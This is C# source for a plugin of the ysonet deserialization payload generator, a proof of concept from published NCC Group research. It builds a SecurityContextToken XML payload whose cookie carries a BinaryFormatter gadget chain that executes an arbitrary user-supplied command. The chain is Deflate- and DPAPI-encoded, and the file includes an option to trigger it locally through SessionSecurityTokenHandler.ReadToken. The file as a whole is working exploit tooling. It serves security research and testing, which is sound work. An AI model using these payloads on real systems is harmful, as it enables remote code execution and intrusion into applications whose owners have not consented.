using NDesk.Options;
using System;
using System.Collections.Generic;
using System.IdentityModel;
using System.IdentityModel.Tokens;
using System.IO;
using System.Xml;
using ysonet.Generators;
using ysonet.Helpers;

/**
 * Author: Soroush Dalili (@irsdl)
 * 
 * Comments: 
 *  This was released as a PoC for NCC Group's research on `Use of Deserialisation in .NET Framework Methods` (December 2018)
 *  See `SessionSecurityTokenHandler.ReadToken Method`: https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens.sessionsecuritytokenhandler.readtoken
 *  Security note was added after being reported: https://github.com/dotnet/dotnet-api-docs/pull/502
 *  This PoC uses BinaryFormatter from TextFormattingRunProperties.
 *  It models the default System.IdentityModel SessionSecurityTokenHandler transform chain: Deflate followed by DPAPI (ProtectedDataCookieTransform).
 *  Because that default handler applies DPAPI (DataProtectionScope.CurrentUser), DPAPI access is required to produce a valid cookie for that handler instance. Without it, a valid cookie cannot be created, so this issue is rarely practical.
 *  This requirement is specific to the default handler's transforms; it is NOT universal to every SessionSecurityToken deserialization sink. A custom or derived handler may use different transforms (see the SharePoint CVE-2026-50522 deflate-only path in SharePointPlugin).
 *  This PoC produces an error and may crash the application
**/

namespace ysonet.Plugins
{
    public class SessionSecurityTokenHandlerPlugin : IPlugin
    {
        static string command = "";
        static bool test = false;
        static bool minify = false;
        static bool useSimpleType = true;
        static bool rawcmd = false;

        static OptionSet options = new OptionSet()
            {
                {"c|command=", "the command to be executed e.g. \"cmd /c calc\"", v => command = v },
                {"t|test", "whether to run payload locally. Default: false", v => test =  v != null },
                {"minify", "Whether to minify the payloads where applicable (experimental). Default: false", v => minify =  v != null },
                {"ust|usesimpletype", "This is to remove additional info only when minifying and FormatterAssemblyStyle=Simple. Default: true", v => useSimpleType =  v != null },
                {"rawcmd", "Command will be executed as is without `cmd /c ` being appended (anything after the first space is an argument).", v => rawcmd = v != null },
            };

        public string Name()
        {
            return "SessionSecurityTokenHandler";
        }

        public string Description()
        {
            return "Generates XML payload for the SessionSecurityTokenHandler class";
        }

        public string Credit()
        {
            return "Soroush Dalili";
        }

        public OptionSet Options()
        {
            return options;
        }

        public object Run(string[] args)
        {
            InputArgs inputArgs = new InputArgs();
            List<string> extra;
            try
            {
                extra = options.Parse(args);
                inputArgs.Cmd = command;
                inputArgs.Minify = minify;
                inputArgs.UseSimpleType = useSimpleType;
                inputArgs.IsRawCmd = rawcmd;
                inputArgs.Test = test;
            }
            catch (OptionException e)
            {
                Console.Write("ysonet: ");
                Console.WriteLine(e.Message);
                Console.WriteLine("Try 'ysonet -p " + Name() + " --help' for more information.");
                throw new Exception(e.Message);
            }

            string payload = @"<SecurityContextToken xmlns='http://schemas.xmlsoap.org/ws/2005/02/sc'>
	<Identifier xmlns='http://schemas.xmlsoap.org/ws/2005/02/sc'>
		urn:unique-id:securitycontext:1
	</Identifier>
	<Cookie xmlns='http://schemas.microsoft.com/ws/2006/05/security'>{0}</Cookie>
</SecurityContextToken>";

            if (minify)
            {
                payload = XmlMinifier.Minify(payload, null, null);
            }

            if (String.IsNullOrEmpty(command) || String.IsNullOrWhiteSpace(command))
            {
                Console.Write("ysonet: ");
                Console.WriteLine("Incorrect plugin mode/arguments combination");
                Console.WriteLine("Try 'ysonet -p " + Name() + " --help' for more information.");
                throw new Exception("Incorrect plugin mode/arguments combination");
            }

            byte[] serializedData = (byte[])new TextFormattingRunPropertiesGenerator().GenerateWithNoTest("BinaryFormatter", inputArgs);
            DeflateCookieTransform myDeflateCookieTransform = new DeflateCookieTransform();
            ProtectedDataCookieTransform myProtectedDataCookieTransform = new ProtectedDataCookieTransform();
            byte[] deflateEncoded = myDeflateCookieTransform.Encode(serializedData);
            byte[] encryptedEncoded = myProtectedDataCookieTransform.Encode(deflateEncoded);
            payload = String.Format(payload, Convert.ToBase64String(encryptedEncoded));


            if (minify)
            {
                payload = XmlMinifier.Minify(payload, null, null);
            }

            if (test)
            {
                // PoC on how it works in practice
                try
                {
                    XmlReader tokenXML = XmlReader.Create(new StringReader(payload));
                    SessionSecurityTokenHandler mySessionSecurityTokenHandler = new SessionSecurityTokenHandler();
                    mySessionSecurityTokenHandler.ReadToken(tokenXML);
                }
                catch (Exception err)
                {
                    Debugging.ShowErrors(inputArgs, err);
                }
            }

            return payload;
        }
    }
}
